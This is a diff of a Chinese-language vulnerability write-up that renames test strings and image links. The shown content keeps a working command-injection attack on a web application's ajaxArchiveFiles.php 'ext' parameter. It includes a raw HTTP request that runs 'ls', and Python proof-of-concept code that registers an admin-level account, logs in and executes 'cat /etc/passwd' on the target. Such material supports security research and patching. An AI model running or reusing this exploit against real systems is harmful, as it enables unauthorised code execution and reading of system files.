@@ -93,9 +93,9 @@ $commandString = "sudo -u apache zip -r -j " . $archiveMainPath . "filename" . $
 请求包为
 
 ```
-GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../pq.txt HTTP/1.1
+GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1
 Host: 
-Cookie: cookname=pqtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71
+Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71
 Cache-Control: max-age=0
 Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
 Sec-Ch-Ua-Mobile: ?0
@@ -105,9 +105,9 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Content-Length: 2
 ```
 
-再请求 **http://xxx.xxx.xxx.xxx/pq.txt** 验证漏洞
+再请求 **http://xxx.xxx.xxx.xxx/test.txt** 验证漏洞
 
-![](image/rc-5.png)
+![](http://wikioss.peiqi.tech/vuln/rc-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -143,10 +143,10 @@ def POC_1(target_url):
     origin = target_url
     multipart_data = MultipartEncoder(
         fields={
-            'username': 'pqtest{}'.format(ran_number),
-            'password': 'PQtest@{}'.format(ran_number),
-            'passconf': 'PQtest@{}'.format(ran_number),
-            'email': 'PQtest{}@test.com'.format(ran_number),
+            'username': 'testtest{}'.format(ran_number),
+            'password': 'testtest@{}'.format(ran_number),
+            'passconf': 'testtest@{}'.format(ran_number),
+            'email': 'testtest{}@test.com'.format(ran_number),
             'ulevelid': '9',
             'add': 'add',
             'editid': ''
@@ -159,9 +159,9 @@ def POC_1(target_url):
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False)
         if "error" not in response.text:
-            username = 'pqtest{}'.format(ran_number)
-            password = 'PQtest@{}'.format(ran_number)
-            print("\033[36m[o] 成功创建账户 pqtest{}/PQtest@{} \033[0m".format(ran_number, ran_number))
+            username = 'testtest{}'.format(ran_number)
+            password = 'testtest@{}'.format(ran_number)
+            print("\033[36m[o] 成功创建账户 testtest{}/testtest@{} \033[0m".format(ran_number, ran_number))
             POC_2(target_url, username, password)
         else:
             print("\033[31m[x] 创建失败:{} \033[0m")
@@ -192,10 +192,10 @@ def POC_2(target_url, username, password):
             if "Stephen Stack" in p.text:
                 print("\033[31m[x] 登录失败 \033[0m")
             else:
-                rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../pq.txt', verify=False,
+                rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../test.txt', verify=False,
                              headers=headers)
                 if "success" in rce.text:
-                    response = s.get(target_url + '/pq.txt', verify=False)
+                    response = s.get(target_url + '/test.txt', verify=False)
                     print("\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(response.text))
                 else:
                     print("\033[31m[x] 请求失败 \033[0m")
@@ -211,4 +211,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/rc-6.png)
+![](http://wikioss.peiqi.tech/vuln/rc-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
